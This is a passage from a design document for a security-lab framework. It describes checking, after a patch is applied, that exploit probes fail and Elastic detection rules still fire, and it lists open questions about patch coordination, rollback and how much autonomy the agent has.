If the agent suggests an Ansible-role-level fix (e.g. "the patch script is missing a `gpupdate /force` step"), it surfaces as a `mark_failed` reason with a markdown diff suggestion. Operator's call whether to update the descriptor PR.

---

## 8. Detection coverage post-patch

The point of `detection_must_fire` is purple-team alignment: a patch should close the *vulnerability* without removing the operator's *visibility* into exploit attempts. After every successful patch, the framework runs the descriptor's `exploit_probe_after_patch` and verifies the matching Elastic rule fires.

### 8.1 Flow

```
patch run completes (verify_patch ✓)
    │
    ▼
run exploit_probe_after_patch from attack box
    │
    ├─ exploit failed (expected) ─────────┐
    │                                      │
    │                                      ▼
    │                            poll Elastic for rule_id alert
    │                            (window: now ± timeout_seconds)
    │                                      │
    │              ┌───────────────────────┼───────────────────────┐
    │              │                       │                       │
    │              ▼                       ▼                       ▼
    │      alert seen ✓             no alert ✗              elastic unreachable
    │      "Detection verified"     "Detection failed       "Detection check skipped
    │      green pill in audit       to fire — invest."     — Elastic unreachable"
    │                                yellow pill            grey pill
    │                                                       (does NOT block patch DONE)
    │
    └─ exploit SUCCEEDED (unexpected) ──▶ AS_PATCHED_BUT_VULN red pill
                                          invoke agent
```

### 8.2 Surfaces in UI

The installed-vuln row gains a `detection:` line in `.spec-row__hint` reflecting the latest patch's detection verification:

```
detection: ✓ verified   (green — exploit attempted, rule fired)
detection: ✗ failed     (yellow — exploit attempted, rule did not fire)
detection: ⊘ skipped    (grey — Elastic unreachable / no rule configured)
detection: ⚠ vulnerable (red — exploit SUCCEEDED post-patch, patch is broken)
```

### 8.3 Forward-compat with Elastic Rules integration

Pairs with the existing memory-tracked Elastic Rules integration (see MEMORY `project_elastic_rules_integration.md`). A `[Open in Elastic Rules]` chip on each row links to the suggested rule pre-filtered, mirroring master plan §10.7 install-time behavior.

---

## 9. Open questions

1. **Cross-host patch coordination.** ZeroLogon and LLMNR patches affect domain-wide state. If two operators patch on different hosts simultaneously, GPO contention can race. Need a domain-scope lock per `patch_complexity: high` block. Open: in-memory mutex in Flask vs. an AD-stored lock object?

2. **KB version drift.** `patch.patch_version` lists KBs by article number, but Microsoft supersedes monthly. Should the framework auto-rewrite descriptors to the latest superseding KB, or pin to a known-good KB and surface upgrade nudges?

3. **`patch_revert` for `rollback_supported: false` vulns (ZeroLogon).** ZeroLogon's KB can't be cleanly uninstalled. Operators who want repeat install/exploit/patch cycles on ZeroLogon need a destructive option (restore DC from a pre-patch snapshot, or recreate the VM). Should the framework expose a `destructive_revert` field tied to a snapshot/AMI rollback workflow?

4. **Existing-cert validity after ESC1 patch.** Patching the template leaves issued certs valid until expiry. Should the patch optionally include a `revoke_existing_certs: true` flag that walks the CA database and revokes anything issued from the now-hardened template? Operationally invasive, but realistic.

5. **Detection rule pinning.** `detection_must_fire.rule_id` points to a rule that may be renamed/retired upstream. Should we pin to a rule UUID + a name-stable fingerprint, with a nightly job that warns on drift?

6. **Bulk patch atomicity.** If a 5-vuln bulk patch fails on item 3, do we roll back items 1–2? Default: no (each is independent, partial-success state is valid). Open: per-host atomic mode for high-stakes labs?

7. **Cost of `exploit_probe_after_patch`.** Each patch verification spawns network traffic from the attack box. For loud probes (Responder, hashcat), the lab may rate-limit or trigger NACL alerts. Should descriptors flag probe loudness, and should we expose a `skip_exploit_probe` operator override?

8. **Agent autonomy on `AS_PATCHED_BUT_VULN`.** This state means the patch script lied — `verify_patch` claimed success, but the host is still exploitable. Is the agent allowed to *re-patch* (retry the patch block with modified inputs), or must it always `mark_failed` so an operator inspects manually? Default proposal: require operator approval to retry on `AS_PATCHED_BUT_VULN`. Open for review.

---

## 10. Cross-references

- Master plan: `/Users/harriskhalid/Desktop/Red_Team_Infra_Local/docs/internal/VULNERABLE_LAB_BOLTON_PLAN.md`
  - §4 schema (extended by this doc §2)
  - §5 resolver (extended by this doc §2.3, §6)
  - §7 agentic fallback (reused by this doc §7)
  - §8.5 installed-on view (extended by this doc §4.1)
  - §10.6 Cleanup integration (extended by this doc §4)
- Sibling refinement: TTP-mapping refinement (planned, supplies the `T1649` / `T1558.003` pills shown in §4.2)
- Elastic Rules integration: MEMORY `project_elastic_rules_integration.md` (paired in §8.3)
- Frontend palette / theming rules: project `CLAUDE.md` "Frontend CSS / Light Mode" section
